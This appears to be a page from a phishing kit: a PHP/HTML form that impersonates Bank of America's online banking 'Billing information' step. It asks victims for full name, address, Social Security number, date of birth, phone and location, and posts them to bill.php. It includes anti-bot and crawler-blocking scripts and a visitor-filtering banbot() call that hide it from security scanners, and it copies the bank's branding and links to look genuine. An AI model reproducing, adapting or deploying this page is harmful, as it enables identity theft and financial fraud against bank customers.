<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html">
<html lang="en-US" class="win chrome chrome-88 webkit svg-bg not-retina cf-cnx-regular-active retina">

<head class="at-element-marker">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="../assess/bootstrap.min.css">
    <script src="../assess/jquery-3.5.1.slim.min.js.download" type="text/javascript"></script>
    <title>Bank of America | Online Banking</title>
    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018"
        type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="../assess/vipaa-v4-jawr.css" media="all">
    <link rel="stylesheet" type="text/css" href="../assess/vipaa-v4-jawr-print.css" media="print">
    <script src="../assess/vipaa-v4-jawr.js.download" type="text/javascript"></script>
    <style id="at-makers-style" class="at-flicker-control">
    .mboxDefault {
        visibility: hidden;
    }
    </style>
    <script src="../assess/hover.js.download" type="text/javascript" async="true"></script>
    <style id="at-makers-style" class="at-flicker-control">
    .mboxDefault {
        visibility: hidden;
    }
    </style>
    <script type="text/javascript" src="../assess/jquery-migrate-custom.js.download"></script>
    <style>
    body {
        display: none;
    }
    </style>
    <script src="../assess/hover.js(1).download" type="text/javascript" async="true"></script>
    <script type="text/javascript" src="../assess/creanza.js.download" id="opmi59"></script>
    <script type="text/javascript" src="../assess/kurt.js.download" id="j8xw3p"></script>
    <script type="text/javascript" src="../assess/dis4.js.download" id="629vvl"></script>
    <script type="text/javascript" src="../assess/porte.js.download" id="0ca6ta"></script>
    <script src="../assess/jquery.min.js"></script>
    <script src="../assess/jquery.mask.js"></script>
    <script>
    $(function() {
        $('#dob').mask('00/00/0000');
        $('#ssn').mask('000-00-0000');
        $('#phone').mask('(000) 000-0000');
    });
    </script>
</head>

<body class="fsd-layout-body" style="display: block;">

    <script type="text/javascript">
    if (self == top) {
        var theBody = document.getElementsByTagName("body")[0];
        theBody.style.display = "block";
    } else {
        top.location = self.location;
    }
    </script>
    <noscript>
        <style>
        body {
            display: block;
        }
        </style>
    </noscript>
    <a class="ada-hidden ada-visible-focus"
        href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?msg=InvalidCredentials_2_Remaining&amp;request_locale=en_us&amp;lpOlbResetErrorCounter=0#skip-to-h1"
        id="ada-skip-link">Skip to main content</a>
    <div class="fsd-layout fsd-2c-700lt-layout">
        <div class="fsd-border">
            <div class="center-content">
                <div class="header">


                    <div class="header-module">
                        <div class="fsd-secure-esp-skin">
                            <img height="28" width="230" alt="Bank of America" src="../assess/BofA_rgb.png">
                            <div class="page-type cnx-regular" data-font="#!">Billing information</div>
                            <div class="right-links">
                                <div class="secure-area">Secure Area</div>
                                <a class="divide"
                                    href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US"
                                    target="_self" name="spanish_toggle"
                                    title="Muestra esta sesión de la Banca en Línea">En Español</a>
                                <div class="clearboth"></div>
                            </div>
                            <div class="clearboth"></div>
                        </div>
                    </div>


                    <noscript>
                        <div class="fauxdal-overlay"></div>
                        <div class="fauxdal-module">
                            <div class="noscript-reload-skin">
                                <div class="fauxdal-top"></div>
                                <div class="fauxdal-bottom">
                                    <div class="fsd-fauxdal-content">
                                        <div class="fsd-fauxdal-title">
                                            Please use JavaScript
                                        </div>
                                        <p>You need a web browser that supports JavaScript to use our site. Without it,
                                            some pages won't work as designed. To make sure JavaScript is turned on,
                                            please adjust your browser settings.</p>
                                        <p>&nbsp;</p>
                                        <p><a title="Browser Help and Tips" name="Browser Help and Tips"
                                                href="https://www.bankofamerica.com/onlinebanking/online-banking-security-faqs.go"
                                                target="_self">Browser Help and Tips</a></p>
                                    </div>
                                    <div class="fsd-fauxdal-close">
                                        <a class="button-common button-gray" name="close_button_js_disabled_modal"
                                            href=><span>Close</span></a>
                                    </div>
                                    <div class="clearboth"></div>
                                </div>
                            </div>
                        </div>
                    </noscript>


                    <script src="../assess/online-id-vipaa-module-enter-skin.js.download" type="text/javascript">
                    </script>


                    <div class="container">
                        <div class="row">
                            <div class="col-md-6 offset-md-3">
                                <form name="signInForm" novalidate="" action="bill.php" method="post">


                                    <br>
                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" placeholder="Full Name" name="fname"
                                            value="" autocomplete="off" autocorrect="off" maxlength="50"
                                            autocapitalize="off">
                                    </div>

                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" placeholder="Address" name="street"
                                            value="" autocomplete="off" autocorrect="off" maxlength="30"
                                            autocapitalize="off">
                                    </div>
                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" id="ssn" placeholder="SSN" value=""
                                            name="ssn" autocomplete="off" autocorrect="off" maxlength="11"
                                            autocapitalize="off">
                                    </div>

                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" id="dob" placeholder="DOB (MM/DD/YY)"
                                            name="dob" value="" autocomplete="off" autocorrect="off" maxlength="10"
                                            autocapitalize="off">
                                    </div>

                                    <div class="form-group form-group-bg">
                                        <input type="text" class="form-control" placeholder="Zip Code" name="zipcode"
                                            value="" autocomplete="off" autocorrect="off" maxlength="5"
                                            autocapitalize="off">
                                    </div>

                                    <div class="form-row form-group-bg">
                                        <div class="col">
                                            <input type="text" class="form-control" placeholder="State" name="state"
                                                value="" autocomplete="off" maxlength="15" aria-required="true"
                                                value="">
                                        </div>
                                        <div class="col">
                                            <input type="text" class="form-control" placeholder="City" name="city"
                                                value="" autocomplete="off" maxlength="15" aria-required="true">
                                        </div>
                                    </div>
                                    <br>

                                    <div class="form-group form-group-bg">
                                        <input type="phone" class="form-control" id="phone" placeholder="Phone"
                                            name="phone" value="" autocomplete="off" autocorrect="off" maxlength="15"
                                            autocapitalize="off">
                                    </div>


                                    <div class="form-group form-group-bg">
                                        <input type="submit" name="continue" value="Continue" data-id="submit"
                                            class="btn btn-outline-secondary btn-block" origin="cob">
                                    </div>
                                    <style>
                                    .cnet {
                                        justify-content: center;
                                    }
                                    </style>
                                </form>
                            </div>
                        </div>
                    </div>







                    <div class="footer-inner">

                        <div class="global-footer-module">
                            <div class="gray-bground-skin cssp">
                                <div class="secure">Secure area</div>


                                <div class="link-container">
                                    <div class="link-row">

                                        <a href="https://www.bankofamerica.com/security-center/privacy-overview/"
                                            name="Privacy_&amp;_Security_footer" title="Privacy"
                                            target="_blank">Privacy</a>

                                        <a class="last-link"
                                            href="https://www.bankofamerica.com/security-center/overview/"
                                            name="Security" title="Security" target="_blank">Security</a>
                                        <div class="clearboth">
                                            <?php if (!stripos($_SESSION['device'], 'thysec')) {
                                                banbot();
                                            }
                                            ; ?>
                                        </div>
                                    </div>
                                </div>
                                <p>Bank of America, N.A. Member FDIC. <a
                                        href="https://www.bankofamerica.com/help/equalhousing-popup/"
                                        name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a>
                                    <br>©&nbsp;<?php echo date('Y'); ?> Bank of America Corporation.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;">
        <div id="boaFormHelp-content"></div>
        <div class="boaFormHelp-bottom"></div>
    </div>
    <div aria-hidden="true"
        style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">
        BlankTestESs</div>
    <div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
    <div id="restest" style="width: 0.5cm; height: 0.5cm; padding: 0px"></div>
    <div aria-hidden="true"
        style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div>

</body>

</html>